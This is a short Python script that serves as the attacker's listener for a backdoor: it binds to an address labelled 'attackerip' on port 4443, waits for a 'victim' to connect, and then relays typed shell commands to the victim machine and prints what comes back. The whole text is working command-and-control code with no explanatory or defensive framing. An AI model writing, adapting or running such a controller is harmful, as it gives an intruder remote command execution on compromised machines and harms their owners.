import socket

attackerip = '10.10.0.6'
attackerport = 4443

server = socket.socket()
server.bind((attackerip, attackerport))
print("[+]Server started!")
print("[+]Listening for victims connections!")
server.listen(1)

victim, victimaddress = server.accept()
print(f"[+]{victimaddress} opened the backdoor! or malware!")

while True:
    cmd = input("Enter command: ")
    cmd = cmd.encode()
    victim.send(cmd)
    print("[+] command sent to target!")
    output = victim.recv(1024)
    output = output.decode()
    print(f"[+]Command output:\n{output}")


